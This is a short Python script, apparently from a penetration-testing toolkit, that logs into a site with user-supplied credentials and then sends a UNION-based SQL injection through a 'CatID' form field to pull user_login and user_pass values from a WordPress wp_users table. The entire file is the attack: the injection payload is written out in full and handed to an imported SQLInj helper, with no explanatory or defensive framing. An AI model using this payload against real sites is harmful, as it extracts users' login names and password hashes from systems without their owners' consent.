import LoginManager
import requests
import re
import csv
import SQLInj

def attack(url):
    performLogin(url)
    headers = {'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost'}
    data = {"CatID": "0 UNION SELECT user_login,user_pass FROM wp_users WHERE ID>=1"}
    SQLInj.attack(url,LoginManager.session,headers,data)


def performLogin(url):
    username = input("\nInsert your username")
    password = input("Insert your password")
    result = LoginManager.login(url,username,password)
    while (not result):
        print("\nYour login failed, Username or password are wrong, insert them again")
        username = input("Insert your username")
        password = input("Insert your password")
        result = LoginManager.login(url, username, password)


